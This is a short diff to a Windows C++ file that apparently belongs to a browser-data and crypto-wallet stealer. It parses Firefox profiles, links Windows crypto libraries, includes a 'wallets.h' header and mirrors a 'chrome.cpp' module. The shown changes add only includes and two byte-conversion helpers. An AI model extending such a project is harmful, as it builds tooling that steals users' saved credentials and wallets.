@@ -1,11 +1,15 @@
 #include <windows.h>
 #include <shlobj.h>
+#include <wincrypt.h>
 #include <string>
 #include <vector>
 #include <sstream>
 #include <memory>
 #include "../common.h"
 #include "sqlite_minimal.cpp"
+#include "wallets.h"
+
+#pragma comment(lib, "crypt32.lib")
 
 // Firefox profile structure
 struct FirefoxProfile {
@@ -441,6 +445,18 @@ private:
             }
         }
         return result;
+    }
+    
+    // Helper functions for compatibility with chrome.cpp structure
+    std::string BytesToString(const std::vector<uint8_t>& bytes) {
+        return std::string(bytes.begin(), bytes.end());
+    }
+    
+    int BytesToInt(const std::vector<uint8_t>& bytes) {
+        if (bytes.size() >= 4) {
+            return *((int*)bytes.data());
+        }
+        return 0;
     }
 };
 
